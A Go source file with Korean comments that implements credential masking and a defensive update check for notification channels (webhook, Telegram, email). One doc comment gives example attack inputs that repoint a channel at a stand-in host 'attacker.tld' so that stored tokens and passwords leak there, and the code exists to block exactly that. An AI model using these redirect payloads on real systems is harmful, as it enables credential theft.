package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix는 마스크 값의 태그 접두사입니다. API 자격 증명을 에코할 때 실제 콘텐츠를 이 접두사가 있는 값으로 바꿉니다.
// 업데이트 인터페이스가 이 접두사가 포함된 값을 수신하면 "라이브러리의 원래 값을 변경하지 않고 유지"하는 것으로 이해됩니다.
//
// 빈 문자열이나 고정 상수 대신 접두사를 사용하는 목적은 약간의 식별 가능한 정보를 가져오는 것입니다.
// (MaskedValue 참조), 사용자는 키를 다시 붙여넣지 않고도 "어떤 로봇인지" 구별할 수 있습니다.
const MaskedPrefix = "__masked__"

// MaskedValue는 마스크 값을 생성합니다.
//
//	"__masked__" 원래 값이 너무 짧아 프롬프트가 표시되지 않습니다.
//	"__masked__:...ab12cd"는 식별 프롬프트로 원래 값의 마지막 6자리를 가져옵니다.
//
// 마지막 6자리만 노출하는 것은 의도적인 선택입니다. Webhook 주소의 식별 정보는 마지막 단락에 있습니다(예: Enterprise WeChat의 key,
// Feishu의 로봇 id)이며 접두사 부분은 각 로봇마다 동일하며 식별 값이 없습니다. 마지막 6자리 숫자는 충분하지 않습니다.
// 자격 증명을 복원하되 구성자가 "내 그룹입니다"를 인식하기에 충분합니다.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked 값이 마스크 값인지 여부를 보고합니다(즉, 인터페이스에서 에코된 후 수정되지 않았습니다).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig 채널의 자격 증명 필드가 마스크된 값으로 대체된 구성의 복사본을 반환합니다.
//
// 알 수 없는 채널 유형은 원래 구성 대신 빈 map를 반환합니다. UI가 "구성을 사용할 수 없음"을 표시하도록 하는 것이 좋습니다.
// 또한 채널 유형을 인식할 수 없는 경우 자격 증명이 포함될 수 있는 원본 콘텐츠 전체를 뱉어내지 마세요.
// UI가 정상적으로 표시될 수 있도록 자격 증명이 아닌 필드를 그대로 둡니다.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers 이 유형의 중첩 구조는 하나의 자격 증명에 따라 전체적으로 처리됩니다. 각 채널은 하위 키를 하나씩 결정하는 데 필요합니다.
		// 그런 다음 "하위 키가 자격 증명인" 규칙 집합을 선언하면 복잡성이 이점을 훨씬 초과합니다.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials는 "대상 주소가 변경되었지만 호출자가 주소를 수정하지 않았음을 의미합니다.
// 자격 증명 필드 설명". 자격 증명을 자동으로 해제하거나 자동으로 삭제하는 대신 반환합니다. 이유는 PrepareConfigUpdate를 참조하세요.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // 변경된 대상 키
	Missing []string // 명시적으로 명시되지 않은 자격 증명 키
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "목적지 주소(" + strings.Join(e.Changed, "、") + ")이 변경되었습니다. 자격 증명 필드(" +
		strings.Join(e.Missing, "、") + "): 새 값을 입력하거나 명시적으로 공백으로 남겨 자격 증명이 더 이상 필요하지 않음을 나타냅니다." +
		"원본 인증서는 이전 주소에 대해서만 유효하며, 계속 사용하는 것은 새 주소로 인증서를 인계하는 것과 같습니다."
}

// PrepareConfigUpdate는 채널 구성을 병합하고 "대상 주소 변경"이라는 보안에 민감한 상황을 처리합니다.
//
// 이는 기본 MergeConfig를 대체하며 채널 업데이트 경로에 사용됩니다. 이는 측정되고 실현 가능한 경로를 해결합니다.
// 대상 주소(메시지가 전송되는 곳)와 자격 증명(메시지를 전송하는 데 사용되는 ID)은 두 개의 독립적인 필드 세트이며 MergeConfig
// "언급되지 않은 키"의 경우 라이브러리의 원래 값이 유지됩니다. 따라서 PATCH 채널에 접속할 수 있는 사람은 누구나 주소만 변경하면 되며,
// 자격 증명을 언급하지 않음으로써 서버는 라이브러리의 실제 자격 증명을 자신이 제어하는 ​​엔드포인트로 보낼 수 있습니다.
//
//	webhook {config:{url:"https://attacker.tld"}} → 원본 Authorization 헤더가 요청과 함께 전송됩니다.
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<진짜Token>/sendMessage
//	email {config:{host:"smtp.attacker.tld"}} → STARTTLS 그런 다음 사용자 이름과 비밀번호를 넘겨주세요.
//
// 이 경로는 완전히 조용하며 리디렉션에 의존하지 않습니다(따라서 호스트 간 점프를 거부해도 차단할 수 없음).
// 그리고 이는 이 패키지 마스킹 메커니즘의 목표인 "자격 증명이 브라우저에 반영되지 않습니다."를 직접적으로 침투합니다.
//
// 규칙: 대상 키가 새 값으로 변경될 때마다 호출자는 각 자격 증명 키에 대해 명시적으로 명시해야 합니다.
//   - 새로운 가치 부여 → 새로운 가치 사용
//   - 빈 문자열을 명시적으로 전달 → 필드에 더 이상 자격 증명이 필요하지 않습니다(지우기 의미 체계 유지).
//   - 마스크 값을 있는 그대로 반환/키를 전혀 언급하지 않음 → 거부
//
// 세 번째 유형도 "마스크 값"이 "이전 자격 증명 상속"을 의미하고 이전 자격 증명을 의미하므로 거부됩니다.
// 이전 주소에만 유효합니다. 여기서는 "자격 증명 자동 삭제"(선택적 자격 증명 필드 쌍)를 의도적으로 수행하지 않습니다.
// (webhook의 headers, email의 password)은 자동으로 "인증이 손실되었지만 인터페이스가 200을 반환합니다"로 변경됩니다.
// 오류를 보고하는 것보다 문제를 해결하는 것이 더 어렵습니다. 차라리 교환원이 한 번 더 작성하도록 하세요.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("채널 유형 %q 등록되지 않음", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// 문자열이 아닌 자격 증명 값(예: headers가 개체인 webhook)이 마스크 리터럴에 포함된 경우
	// 이는 호출자가 "원래 값 유지" 센티넬을 구조에 삽입했음을 보여줍니다. MergeConfig는 "문자열만 인식합니다.
	// "라는 접두사가 붙은 것은 마스크입니다. 이 양식은 일반 객체로 저장됩니다. 라이브러리는 실제로 리터럴을 남겨둡니다.
	// "__masked__", 후속 인증은 오류 없이 자동으로 실패합니다. 차라리 거절하겠습니다.
	//
	// 이 수표는 앞쪽에 배치해야 합니다. 주소가 변경되지 않은 경우 일찍 반환됩니다. 마지막에 넣는 것은 다음과 같습니다.
	// "주소 변경" 경로만 다룹니다(첫 번째 버전이 잘못 배치된 방식이며 테스트에서 직접 발견했습니다).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// 실제로 변경된 대상 키를 찾습니다. 마스크 값은 "변경되지 않음"과 같습니다.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// 주소는 변경되지 않았으며 일반 병합이 수행됩니다(마스크 값은 원래 값을 유지하고 빈 문자열은 지워지며 나머지는 덮어쓰기됩니다).
		return MergeConfig(stored, incoming), nil
	}

	// 주소가 변경되었습니다. 각 자격 증명 키를 명시적으로 표시해야 합니다.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers 문자열이 아닌 구조에 포함된 마스크된 센티넬 제출을 거부합니다.
//
// 마스킹 메커니즘의 전제는 "전체 값이 문자열이다"입니다. webhook의 headers와 같은 객체 필드,
// 전체를 마스킹하거나("__masked__" 문자열로 작성) 전체적으로 제출할 수만 있습니다. 센트리를 물체 안에 넣습니다.
// "변경되지 않은 상태로 유지"라고 표현할 수 없으며 실제 값으로 라이브러리에 저장됩니다.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("%s 필드의 내용에는 마스크 표시 %q가 포함됩니다. 이 필드는 상속을 나타내거나 새 값이 전체적으로 제출되었음을 나타내기 위해 비워 둘 수만 있습니다. 마스크 자리 표시자는 구조 내부에 포함될 수 없습니다.",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue 두 구성 값이 동일한지 비교합니다. 부수적 처리를 위해 JSON 직렬화 비교 사용
// 유형 차이 - 프런트 엔드에서 제출한 포트는 number이지만 라이브러리에서 다시 읽은 포트는 float64입니다. 직접 ==하면 오판이 발생합니다.
//
// 비교하기 전에 "비어 있음"을 정규화해야 합니다. 빈 문자열과 "키가 존재하지 않습니다"는 이 구성 모델에서 동일한 상태입니다.
// MergeConfig는 빈 문자열을 명시적 지우기로 처리하므로 delete는 키를 직접 지웁니다. 정규화 없이,
// 항상 공백으로 남아 있는 선택적 대상 필드(Telegram의 base_url는 유일한 해당 필드입니다. 사용하려면 공백으로 남겨두세요)
// 공식 주소)는 이 길을 택합니다——
//
//	새로운 생성을 생성할 때 base_url: "" 저장 → 처음 저장할 때 MergeConfig로 키 삭제
//	→ 2번째 저장 시 incoming는 "", stored는 키가 누락되어 "주소 변경됨"으로 판단됩니다.
//	→ 크리덴셜은 마스크 값입니다 → 400 "대상 주소가 변경되었습니다. 크리덴셜 필드도 다시 채워주세요"
//
// 사용자가 Bot Token를 다시 붙여넣고 아무것도 변경하지 않는 한 그 이후의 모든 저장은 실패합니다.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue 구성 값이 "null"인지 여부를 결정합니다.
// 구경은 MergeConfig(strings.TrimSpace(s) == "")의 클리어 판단과 일치해야 합니다.
// 그렇지 않으면 "MergeConfig가 삭제해야 한다고 생각하는 것과 sameConfigValue가 가치 있다고 생각하는 것" 사이에 격차가 생길 것입니다.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig는 채널 구성 업데이트를 위해 incoming를 stored에 병합합니다.
//
// 규칙:
//   - incoming에서 값이 마스크인 키 → stored의 원래 값을 유지합니다. (사용자가 이 필드를 변경하지 않았습니다.)
//   - incoming → 값이 빈 문자열인 키는 명시적으로 지워진 것으로 간주되어 해당 키가 삭제됩니다.
//   - 나머지 키 → incoming 값으로 덮어쓰기
//   - stored에는 있지만 incoming에는 없는 키 → 유지됨(로컬 업데이트 의미)
//
// 빈 문자열이 "삭제"로 간주되는지 여부를 명확히 해야 합니다. 프런트 엔드 양식은 채워지지 않은 필드를 빈 문자열로 제출합니다.
// 유효한 값으로 쓰면 "원래 값을 유지하려면 공백으로 남겨두세요" 필드가 지워집니다.
// 잘못 설정된 필드를 지울 때 사용자가 다른 표현 방법을 사용할 수 없기 때문에 여기서는 명시적 지우기를 선택합니다.
// (드래그 필드는 "제공되지 않음"과 "제공된 null 값"을 구별할 수 있지만 UI는 이러한 구별을 사용하지 않습니다.)
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // 마스크 값 = 수정되지 않음, 예약됨 stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
